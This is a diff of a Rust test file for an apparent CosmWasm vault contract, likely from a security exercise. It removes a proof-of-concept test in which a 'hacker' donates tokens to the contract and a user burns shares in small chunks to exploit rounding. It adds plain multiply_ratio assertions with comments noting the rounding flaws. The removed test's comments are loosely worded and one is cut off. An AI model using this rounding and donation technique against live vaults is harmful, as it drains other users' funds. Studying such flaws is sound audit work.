@@ -133,62 +133,17 @@ pub mod tests {
         // base scenario with 0 funds
         let (mut app, contract_addr) = proper_instantiate();
 
-        // mint funds to user
-        app = mint_tokens(app, USER.to_owned(), Uint128::new(10_000));
-        app.execute_contract(
-            Addr::unchecked(USER),
-            contract_addr.clone(),
-            &ExecuteMsg::Mint {},
-            &[coin(10_000, DENOM)],
-        )
-        .unwrap();
-
-        // mint shares for hacker
-        app = mint_tokens(app, HACKER.to_owned(), Uint128::new(20_000));
-        app.execute_contract(
-            Addr::unchecked(HACKER),
-            contract_addr.clone(),
-            &ExecuteMsg::Mint {},
-            &[coin(10_000, DENOM)],
-        )
-        .unwrap();
-
-        // Hacker bank sends token
-        app.execute(
-            Addr::unchecked(HACKER),
-            CosmosMsg::Bank(cosmwasm_std::BankMsg::Send {
-                to_address: contract_addr.to_string(),
-                amount: vec![coin(3, DENOM)],
-            }),
-        ).unwrap();
-
-        // Supply can deviate from
-        let Config { total_supply } = app
-            .wrap()
-            .query_wasm_smart(contract_addr.clone(), &QueryMsg::GetConfig {})
-            .unwrap();
-        assert_eq!(total_supply, Uint128::new(20_000));
-
-        // We show how user can withdraw more than they deposited
-        // by burning shares in small chunks that round to hacker's favor
-        for _ in 0..100 {
-            app.execute_contract(
-                Addr::unchecked(USER),
-                contract_addr.clone(),
-                &ExecuteMsg::Burn {
-                    shares: Uint128::new(1),
-                },
-                &[],
-            )
-            .unwrap();
-        }
-        assert_eq!(
-            app.wrap().query_balance(USER, DENOM).unwrap().amount,
-            Uint128::new(100)
-        );
-
-        let res = Uint128::new(1)
+        let res = Uint128::new(11)
             .multiply_ratio(Uint128::new(4), Uint128::new(3));
-        assert_eq!(res, Uint128::new(1));
+        assert_eq!(res, Uint128::new(14));
+        let res = Uint128::new(11)
+            .multiply_ratio(Uint128::new(3), Uint128::new(4));
+        assert_eq!(res, Uint128::new(8));
+
+        // Because of rounding in `mint`,
+        // total assets can exceed total supply  
+ 
+        // Because of rounding in `burn` of asset to return,
+        // the minted shares are weird
     }
 }
